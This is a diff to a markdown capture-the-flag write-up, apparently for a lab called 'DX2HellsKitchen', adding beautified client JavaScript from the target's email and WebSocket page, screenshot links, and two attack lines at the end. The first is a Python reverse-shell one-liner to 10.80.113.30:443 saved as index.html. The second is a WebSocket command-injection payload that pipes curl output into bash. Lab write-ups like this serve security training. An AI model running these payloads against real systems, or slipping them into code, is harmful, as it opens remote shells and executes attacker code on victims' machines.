@@ -303,6 +303,7 @@ bad request
 
 - https://beautifier.io/</p>
 
+```bash
    < script type = "text/javascript" >
        let elems = document.querySelectorAll(".email_list .row");
    for (var i = 0; i < elems.length; i++) {
@@ -323,10 +324,101 @@ bad request
    let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    socket.onmessage = e => document.querySelector(".time").innerText = e.data, setInterval((() => socket.send(tz)), 1e3); <
    /script>
-                
+```         
+
+<br>
+<h3 align="center">:4346</h3>
+
+<img width="1107" height="345" alt="image" src="https://github.com/user-attachments/assets/dac51eb9-9467-4dd1-908e-e99dc51391ef" />
+
+<br>
+<br>
+
+<img width="1204" height="711" alt="image" src="https://github.com/user-attachments/assets/a32ff553-37a1-4cb2-a638-fc98f32cfa9b" />
+
+
+<br>
+<br>
+
+<img width="1197" height="710" alt="image" src="https://github.com/user-attachments/assets/3327e02b-4689-42d6-8944-a0c7580b165e" />
+
+<br>
+<br>
+
+<img width="1203" height="712" alt="image" src="https://github.com/user-attachments/assets/6b993e1c-abf9-4533-8ef8-2c1a63c01094" />
+
+
+<br>
+<br>
+
+<img width="1203" height="709" alt="image" src="https://github.com/user-attachments/assets/a52d36fd-8eff-430c-a04c-92800a45d4d9" />
+
+<br>
+<br>
+
+<img width="1204" height="722" alt="image" src="https://github.com/user-attachments/assets/9b796e44-8221-4810-8836-35af8a63e398" />
+
+
+<br>
+<br>
+
+<img width="1204" height="281" alt="image" src="https://github.com/user-attachments/assets/b93846cd-00b1-410e-9501-d03e0717ad06" />
+
+<br>
+<br>
+
+<img width="776" height="334" alt="image" src="https://github.com/user-attachments/assets/f0d9283c-6fab-4b6a-93d9-4d97d0de8db2" />
+
+<br>
+<br>
+<h3 align="center">JS Beautify</h3>
+
+```bash
+let elems = document.querySelectorAll(".email_list .row");
+for (var i = 0; i < elems.length; i++) {
+    elems[i].addEventListener("click", (e => {
+        document.querySelector(".email_list .selected").classList.remove("selected"), e.target.parentElement.classList.add("selected");
+        let t = e.target.parentElement.getAttribute("data-id"),
+            n = e.target.parentElement.querySelector(".col_from").innerText,
+            r = e.target.parentElement.querySelector(".col_subject").innerText;
+        document.querySelector("#from_header").innerText = n, document.querySelector("#subj_header").innerText = r, document.querySelector("#email_content").innerText = "", fetch("/api/message?message_id=" + t).then((e => e.text())).then((e => {
+            document.querySelector("#email_content").innerText = atob(e)
+        }))
+    })), document.querySelector(".dialog_controls button").addEventListener("click", (e => {
+        e.preventDefault(), window.location.href = "/"
+    }))
+}
+const wsUri = `ws://${location.host}/ws`;
+socket = new WebSocket(wsUri);
+let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+socket.onmessage = e => document.querySelector(".time").innerText = e.data, setInterval((() => socket.send(tz)), 1e3);
+```
+
+
+<br>
+<br>
+<h3 align="center">WebSockets history</h3>
+
+<img width="1162" height="132" alt="image" src="https://github.com/user-attachments/assets/da357631-9efe-414c-b474-119ece74e164" />
+
+
+<img width="1154" height="124" alt="image" src="https://github.com/user-attachments/assets/7320079a-5eef-4c4a-b282-0df8accd674c" />
+
+<img width="1156" height="103" alt="image" src="https://github.com/user-attachments/assets/aa70438d-df8e-43b1-bac9-fa4a7fb3294b" />
 
 
 
+<img width="1172" height="581" alt="image" src="https://github.com/user-attachments/assets/a2212078-8e5e-4b44-8089-bc388d655512" />
+
+```bash
+:~/DX2HellsKitchen# cat index.html
+python -c 'import socket, subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.80.113.30",443);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+
+```bash
+>> socket.send("$(curl 10.80.113.30:8000|bash")
+```
 
 
 
